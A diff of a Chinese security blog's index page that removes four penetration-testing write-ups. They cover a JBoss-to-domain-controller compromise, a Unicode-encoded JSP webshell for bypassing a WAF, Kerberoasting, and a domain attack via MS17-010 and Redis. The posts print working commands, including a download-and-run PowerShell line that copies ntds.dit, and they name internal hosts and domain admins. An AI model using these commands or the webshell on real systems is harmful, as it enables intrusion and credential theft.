@@ -1,912 +1,238 @@
-<!DOCTYPE html>
+<!DOCTYPE HTML>
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
-    <meta http-equiv="content-type" content="text/html; charset=utf-8">
-    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
-    <title>c1y2m3’blog</title>
-    <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css">
-    <link rel="stylesheet" href="/c1y2m3.github.io/css/gitment.css">
-    <link rel="stylesheet" type="text/css" href="//at.alicdn.com/t/font_859455_eaq7v6w8ktj.css">
+  <meta charset="utf-8">
+  
+  <title>c1y2m3’blog</title>
+  <meta name="author" content="John Doe">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="c1y2m3’blog">
+
+  
+    <meta property="og:image" content="">
+  
+
+  
+    <link rel="alternative" href="/c1y2m3.github.io/atom.xml" title="c1y2m3’blog" type="application/atom+xml">
+  
+  
+    <link href="/c1y2m3.github.io/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/c1y2m3.github.io/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/c1y2m3.github.io/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/c1y2m3.github.io/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/c1y2m3.github.io/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/c1y2m3.github.io/css/responsive.css" media="screen" type="text/css">  
+  <link rel="stylesheet" href="/c1y2m3.github.io/css/sidenav.css" media="screen" type="text/css">  
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/c1y2m3.github.io/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
 </head>
-<body>
-<header class="header">
-    <div class="header-inner">
-        <div class="header-title">
-
-        </div>
-        <nav class="header-nav">
-            
-            <a href="/c1y2m3.github.io/" class="header-nav-link">
-                首页
-            </a>
-            
-
-            
-            <a href="/c1y2m3.github.io/archives" class="header-nav-link">
-                归档
-            </a>
-            
-
-            
-            <a href="/c1y2m3.github.io/tags" class="header-nav-link">
-                标签
-            </a>
-            
-
-            
-        </nav>
-    </div>
-</header>
-<header class="mobile-header">
-    <div class="mobile-nav">
-        <div class="mobile-nav-icon">
-            <span></span>
-            <span></span>
-            <span></span>
-        </div>
-        <div class="mobile-nav-title">
-            <a href="/c1y2m3.github.io/" class="mobile-nav-title-link">John Doe's Blog</a>
-        </div>
-
-    </div>
-    <nav class="mobile-menu">
-        <ul class="mobile-menu-list">
-            <li class="mobile-menu-item">
-                <i class="iconfont icon-home"></i>
-                <a href="/c1y2m3.github.io/" class="mobile-nav-link">首页</a>
-            </li>
-            <li class="mobile-menu-item">
-                <i class="iconfont icon-archive"></i>
-                <a href="/c1y2m3.github.io/archives" class="mobile-nav-link">归档</a>
-            </li>
-            <li class="mobile-menu-item">
-                <i class="iconfont icon-tag"></i>
-                <a href="/c1y2m3.github.io/tags" class="mobile-nav-link">标签</a>
-            </li>
-            <li class="mobile-menu-item">
-                <i class="iconfont icon-about"></i>
-                <a href="/c1y2m3.github.io/about/" class="mobile-nav-link">关于</a>
-            </li>
-        </ul>
-    </nav>
-</header>
-<div class="main">
-    <div class="content-inner">
-        <div class="posts">
-    
-        <article class="post-abstract">
-            <div class="post-title">
-                <h2><a class="post-title-link" href="/c1y2m3.github.io/2019/05/26/26/">JBoss引起的内网渗透</a></h2>
-            </div>
-            <div class="post-meta">
-                <span class="post-time">2019-05-26</span>
-                
-            </div>
-            <div class="post-content">
-                
-                    <h1 id="切入点"><a href="#切入点" class="headerlink" title="切入点"></a>切入点</h1><p>Jboss的反序列化漏洞，获取到shell，就不多说了，远程部署war。</p>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami  --&gt; windows-7p8piq7\administrator</span><br><span class="line">ipconfig --&gt; 192.168.58.231</span><br><span class="line">tasklist --&gt; 360EntClient.exe \ZhuDongFangYu.exe .. (360全家桶)</span><br><span class="line">systeminfo --&gt; Windows Server 2008 R2 Enterprise</span><br></pre></td></tr></table></figure>
-<h1 id="横向拓展"><a href="#横向拓展" class="headerlink" title="横向拓展"></a>横向拓展</h1><h2 id="前奏"><a href="#前奏" class="headerlink" title="前奏"></a>前奏</h2><p>用<code>CS</code>生成<code>powershell</code>的<code>exp</code>就过了。到目标机<code>cmd</code>下执行弹回。由于权限较高，</p>
-<p>直接<code>run Mimikatz</code> 获取到了当前主机用户的ntlm hash。</p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3af1ea3b4a292e072f80" alt=""></p>
-<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>使用<code>Cobalt Strike</code>的ARP扫描（因为net view使用不了），使得<code>Targets</code>有记录。</p>
-<p>用比较典型的<code>hash传递</code>碰一下看看运气怎么样。</p>
-<p>登陆情况如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.58.1 # 成功</span><br><span class="line">192.168.58.18 # 成功</span><br><span class="line">....</span><br><span class="line">192.168.58.3 # 失败</span><br><span class="line">192.168.58.7 # 失败</span><br><span class="line">....</span><br><span class="line">192.168.58.68 # 成功</span><br><span class="line">192.168.58.21 # 成功</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3b182711cd2096ff5116" alt=""></p>
-<p>这个过程就是不断的进行<code>hash注入</code>，不断的<code>dump密码</code>，结果就如上图。看<code>Credentials</code>里是否存在域管用户账密。<br><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3ac59b521a11ecb7384f" alt=""></p>
-<h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">从58.18的机子上发现存在域： </span><br><span class="line"></span><br><span class="line">所属域 --&gt;MERCURY.COM  近1400个域用户...</span><br><span class="line"></span><br><span class="line">nltest /dclist:MERCURY.COM #查看域控 （2个)</span><br><span class="line"></span><br><span class="line">pdc.mercury.com [PDC]  --&gt; 主dc --&gt; 192.168.58.2</span><br><span class="line">BDC.mercury.com        --&gt; 备dc --&gt; 192.168.58.1</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">net group &quot;domain admins&quot; /domain  #查看域管理员 （9个)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">Administrator            chenfeng                 chudonggen               </span><br><span class="line">dongzhiwei               IT                       lifen                    </span><br><span class="line">qiaopeng                 weiwei                   zhangxuejun </span><br><span class="line"></span><br><span class="line">net group &quot;domain controllers&quot; /domain  #查看域控制器</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">BDC$                     PDC$</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3aa72711cd2096ff4e6f" alt=""></p>
-<p>然而发现我已经获取到了dc的账号密码。并在<code>CS</code>上上线了，这就意味的此时的域已经沦陷。</p>
-<p>同时通过GPP组策略漏洞成功解密出administraor密码：<br><img src="https://www.yunzhijia.com/microblog/filesvr/5cf13b8ddb5aa6649fc91a2b" alt=""><br><img src="https://www.yunzhijia.com/microblog/filesvr/5cf13cfcea3b4a79232077e9" alt=""></p>
-<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
-<li>vssadmin 无法提取出ntds.dit、在系统中卡死</li>
-<li>ntdsutil 被破坏、无法运行</li>
-<li>存在杀软，mimikatz 无法执行</li>
-</ul>
-<h2 id="突破方法："><a href="#突破方法：" class="headerlink" title="突破方法："></a>突破方法：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1&apos;); Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\Users\dongzhiwei\Desktop\ntds.dit&quot;</span><br></pre></td></tr></table></figure>
-<p>这里用powerSploit框架中的Invoke-NinjaCopy,远程复制文件，成功提取到ntds.dit / system.hive</p>
-<h2 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h2><p>参考链接：<a href="https://github.com/zcgonvh/NTDSDumpEx" target="_blank" rel="noopener">https://github.com/zcgonvh/NTDSDumpEx</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsdumpex.exe -d ntds.dit -o hash.txt -s system.hiv</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3a81e67d0a23c65bb1e0" alt=""></p>
-<p>之前给自己挖了个坑，关于任何去获取域用户的登录IP，除了nmap外，可以ping域用户名，然而这是一个非常错误的认知，这种前提是机器名和用户名相同，这种情况少之又少。</p>
-<p>参考klion牛的方法：</p>
-<p>从目标主控中导出成功登录日志,来定位指定目标机器</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell hostname</span><br><span class="line">beacon&gt; shell wevtutil epl Security c:\windows\logs\risalogs.evtx /q:&quot;*[EventData[Data[@Name=&apos;LogonType&apos;]=&apos;3&apos;] and System[(EventID=4624) and TimeCreated[timediff(@SystemTime) &lt;= 4449183132]]]&quot;</span><br><span class="line">beacon&gt; shell tasklist | findstr &quot;wevtutil.exe&quot;</span><br><span class="line">beacon&gt; shell dir c:\windows\logs\risalogs.evtx</span><br><span class="line">beacon&gt; download c:\windows\logs\risalogs.evtx</span><br><span class="line">beacon&gt; downloads</span><br></pre></td></tr></table></figure>
-<p>利用 <code>Log Parser</code> 日志分析工具,从log中匹配：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o csv &quot;SELECT TO_UPPERCASE(EXTRACT_TOKEN(Strings,5,&apos;|&apos;)) as NAME,TO_UPPERCASE(EXTRACT_TOKEN(Strings,18,&apos;|&apos;)) as IP FROM c:\risalogs.evtx&quot; &gt; C:\log.txt</span><br><span class="line"></span><br><span class="line">进行去重、替换：</span><br><span class="line"></span><br><span class="line">grep -v &apos;\$&apos; log.txt | sort | uniq | egrep -v &apos;ANONYMOUS LOGON|-|:&apos; &gt; login_succeed.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3a5f2711cd2096ff4c8f" alt=""></p>
-<h1 id="收尾"><a href="#收尾" class="headerlink" title="收尾"></a>收尾</h1><p>​    从内网中获取了大量主机权限，VPN、核心代码，数据库等，逐进行放弃权限，删除后门，所有操作并未更改，下载，删除等一切损害该公司的行为。</p>
-
-                
-            </div>
-        </article>
-    
-        <article class="post-abstract">
-            <div class="post-title">
-                <h2><a class="post-title-link" href="/c1y2m3.github.io/2019/04/04/15543609538285/">JSP Shell Bypass WAF</a></h2>
-            </div>
-            <div class="post-meta">
-                <span class="post-time">2019-04-04</span>
-                
-            </div>
-            <div class="post-content">
-                
-                    <p><code>主要提供一种思路，戒骄戒躁</code></p>
-<p>之前在一次项目中，发现后台可以编辑网站模板，经过一波怼，发现几乎上传不上 </p>
-<p>由于JSP 的content-type 类型为 text/html  </p>
-<p>故利用此特性 使用html中 Unicode 16进制编码 成功上传，后查看进程 发现存在360网站卫士、腾讯网站防护..</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">\u0069\u0066\u0020\u0028\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u0022\u0043\u006f\u006d\u006d\u0061\u006e\u0064\u003a\u0020\u0022\u0020\u002b\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0020\u002b\u0020\u0022\u005c\u006e\u003c\u0042\u0052\u003e\u0022\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0020\u0070\u0020\u003d\u0020\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0020\u002f\u0063\u0020\u0022\u0020\u002b\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u006f\u0073\u0020\u003d\u0020\u0070\u002e\u0067\u0065\u0074\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0069\u006e\u0020\u003d\u0020\u0070\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0044\u0061\u0074\u0061\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0064\u0069\u0073\u0020\u003d\u0020\u006e\u0065\u0077\u0020\u0044\u0061\u0074\u0061\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0069\u006e\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0064\u0069\u0073\u0072\u0020\u003d\u0020\u0064\u0069\u0073\u002e\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0077\u0068\u0069\u006c\u0065\u0020\u0028\u0020\u0064\u0069\u0073\u0072\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0020\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u0064\u0069\u0073\u0072\u0029\u003b\u0020\u0064\u0069\u0073\u0072\u0020\u003d\u0020\u0064\u0069\u0073\u002e\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065\u0028\u0029\u003b\u0020\u007d\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u007d</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-<p>解码为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">if (request.getParameter(&quot;cmd&quot;) != null) &#123;</span><br><span class="line">        out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;\n&lt;BR&gt;&quot;);</span><br><span class="line">        Process p = Runtime.getRuntime().exec(&quot;cmd.exe /c &quot; + request.getParameter(&quot;cmd&quot;));</span><br><span class="line">        OutputStream os = p.getOutputStream();</span><br><span class="line">        InputStream in = p.getInputStream();</span><br><span class="line">        DataInputStream dis = new DataInputStream(in);</span><br><span class="line">        String disr = dis.readLine();</span><br><span class="line">        while ( disr != null ) &#123;</span><br><span class="line">                out.println(disr); disr = dis.readLine(); &#125;</span><br><span class="line">        &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-                
-            </div>
-        </article>
-    
-        <article class="post-abstract">
-            <div class="post-title">
-                <h2><a class="post-title-link" href="/c1y2m3.github.io/2019/04/02/15542127307091/">域渗透之Kerberoasting攻击</a></h2>
-            </div>
-            <div class="post-meta">
-                <span class="post-time">2019-04-02</span>
-                
-            </div>
-            <div class="post-content">
-                
-                    <h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>SPN</p>
-<p>全称 <code>Service Principal Names</code></p>
-<p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN</p>
-<p>SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下</p>
-<p>当一个服务的权限为 <code>Local System</code>或<code>Network Service</code>，则SPN注册在机器帐户(Computers)下</p>
-<p>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p>
-<h1 id="SPN的格式："><a href="#SPN的格式：" class="headerlink" title="SPN的格式："></a>SPN的格式：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass/host:port/servicename</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5ca32869e67d0a40cbc9b874" alt=""></p>
-<p>tips：</p>
-<p>1、serviceclass 可以理解为服务的名称，常见的有www、SMTP、DNS、exchange、HOST等</p>
-<p>2、host有两种形式，FQDN和NetBIOS名,例如WIN-TL226LF48RT.corp.vk.local和WIN-TL226LF48RT</p>
-<h1 id="查询SPN"><a href="#查询SPN" class="headerlink" title="查询SPN"></a>查询SPN</h1><p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分,因此查询SPN的操作难以被检测到</p>
-<p>(1) 使用SetSPN</p>
-<p>Windows下自带工具</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -q */*</span><br></pre></td></tr></table></figure>
-<p>查看test域内所有的SPN:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -T test -q */*</span><br></pre></td></tr></table></figure>
-<h1 id="Kerberos的原理："><a href="#Kerberos的原理：" class="headerlink" title="Kerberos的原理："></a>Kerberos的原理：</h1><p><img src="https://green-m.github.io/styles/images/kerberos/kerberos_01.png" alt=""></p>
-<p>在4.tgs_reply,用户将收到由目标服务实例的NTLM hash加密生成的TGS(Service ticket)， 加密算法为RC4-HMAC</p>
-<p>站在利用的角度，当获得这个TGS后，我们可以尝试穷举口令，模拟加密过程，生产TGS进行比较。如果TGS相同，就能获取到目标实例的明文口令。</p>
-<h1 id="2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系"><a href="#2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系" class="headerlink" title="2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系"></a>2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系</h1><p>这里举一个例子：</p>
-<p>用户a要访问Mysql服务的资源，进行4.tgs_reply时,步骤如下：</p>
-<p>(1)Domain Controller查询MySQL服务的SPN</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果该SPN注册在机器帐户(Computers)下，将会查询所有机器帐户(Computers)的servicePrincipalName属性，找到对应的帐户</span><br><span class="line"></span><br><span class="line">如果该SPN注册在域用户帐户(Users)下，将会查询所有域用户(Users)的servicePrincipalName属性，找到对应的帐户</span><br></pre></td></tr></table></figure>
-<p>(2)找到对应的帐户后，使用该帐户的NTLM hash，生成TGS</p>
-<h1 id="Kerberoasting的实现方法"><a href="#Kerberoasting的实现方法" class="headerlink" title="Kerberoasting的实现方法"></a>Kerberoasting的实现方法</h1><p>综上，域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解</p>
-<p>对于破解出的明文口令，只有域用户帐户(Users)的口令存在价值，不必考虑机器帐户的口令(无法用于远程连接)</p>
-<p>具体思路为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询SPN -&gt; 请求TGS -&gt; 导出TGS -&gt; 暴力破解</span><br></pre></td></tr></table></figure>
-<p> 一、使用Mimikatz实现:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list /export</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5ca33aaa2711cd74739042e5" alt=""></p>
-<h1 id="破解："><a href="#破解：" class="headerlink" title="破解："></a>破解：</h1><p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tgsrepcrack.py wordlist.txt 0-40e00000-Administrator@krbtgt~CORP.VK.LOCAL-CORP.VK.LOCAL.kirbi</span><br></pre></td></tr></table></figure>
-<h1 id="二、使用Powershell实现"><a href="#二、使用Powershell实现" class="headerlink" title="二、使用Powershell实现"></a>二、使用Powershell实现</h1><p>自动实现，并且不需要mimikatz，普通用户权限即可，参考资料：</p>
-<p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p>
-<p>使用<code>System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>请求TGS，在返回结果中提取出TGS，输出的TGS可选择John the Ripper或Hashcat进行破解</p>
-<p>实例演示：</p>
-<p>在域内一台主机上以普通用户权限执行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl</span><br></pre></td></tr></table></figure>
-<p>-AdminCount表示选择高权限的用户</p>
-<p>输出结果如下图</p>
-<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-2.png" alt=""></p>
-<p>只提取Hash：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation</span><br></pre></td></tr></table></figure>
-<p>使用hashcat破解的参数如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force</span><br></pre></td></tr></table></figure>
-<p>  破解结果如下图，成功获得明文口令<code>MySQLAdmin111!</code></p>
-<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-4.png" alt=""></p>
-
-                
-            </div>
-        </article>
-    
-        <article class="post-abstract">
-            <div class="post-title">
-                <h2><a class="post-title-link" href="/c1y2m3.github.io/2019/03/16/----1/">记一次域渗透攻击测试</a></h2>
-            </div>
-            <div class="post-meta">
-                <span class="post-time">2019-03-16</span>
-                
-            </div>
-            <div class="post-content">
-                
-                    <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前段参与了一个项目,在项目中,实行的范围在一个会议室，目的是检测内网安全,并需要拿到该公司的财务报表，此文将全部脱敏，涉及某厂商，中间会穿插一些小的知识点与细节。</p>
-<h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><p>一开始，通过沟通，拿到了内网所在的IP段及所对应的部门信息，由于内部wifi认证缺陷，导致dhcp分配给我了个白名单ip,并且绑定了我的MAC，使得我不使用入网账号直接连入办公网。</p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8cbf602711cd7473912722" alt=""></p>
-<p>为了能尽快找到突破口，这里我直接用ms17-010,并得到以下结果:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">192.168.5.46(Windows7 Ultimate7601 ServicePack 1) 财务部\董办</span><br><span class="line">192.168.2.209(Windows Server2008R2 Standard 7600) </span><br><span class="line">192.168.20.75(Windows Server2012 R2) </span><br><span class="line">192.168.6.31(Windows 7 Enterprise  7601) 人力资源部</span><br><span class="line">192.168.7.98 (Windows7 Ultimate7601 ServicePack 1) 运维和安全</span><br><span class="line">192.168.8.81 (Windows7 Ultimate7601 ServicePack 1)  信息技术事业部</span><br><span class="line">192.168.8.124  (Windows7 Ultimate7601 ServicePack 1)</span><br></pre></td></tr></table></figure>
-<p>心想 内网中每个ip段都雨露均沾了，岂不是美滋滋，然而并不是这样,在后面发现由于内网存在趋势防火墙、360套餐，已经把特征流量进行了拦截，这就有点悲剧了， (后续) -&gt;  通过python发送shellcode 成功拿下 一台192.168.2.209 测试段的域控，推测是研发的测试机，故未深入。</p>
-<p>于是放弃了这个突破点，对内网的资产进行了探测，发现了大量研发部的mysql、dubbo、Jenkins、redis等弱口令，通过这些获取到了不少信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.2:6379 is Redis Unauthorized</span><br><span class="line">192.168.20.205:6379 is Redis Unauthorized </span><br><span class="line">192.168.2.252:6379 redis unauthorized   </span><br><span class="line"> 192.168.3.2:6379 redis unauthorized</span><br><span class="line">192.168.20.71:6379 redis unauthorized</span><br><span class="line">192.168.20.67:6379 redis username:null,password:123456</span><br><span class="line">192.168.20.68:6379 redis username:null,password:123456</span><br><span class="line">192.168.20.205:6379 redis unauthorized</span><br></pre></td></tr></table></figure>
-<p>由于安全设置问题，导致无法写入，最后只成功写入一台并反弹shell<br><img src="https://www.yunzhijia.com/microblog/filesvr/5c8c7e1bea3b4a6a8ff95b97" alt=""><br>后面又利用Supervisord远程代码执行、Jenkins等拿下了几台linux机器，当然，在内网中，这不值得一说，就不一样诉说了。</p>
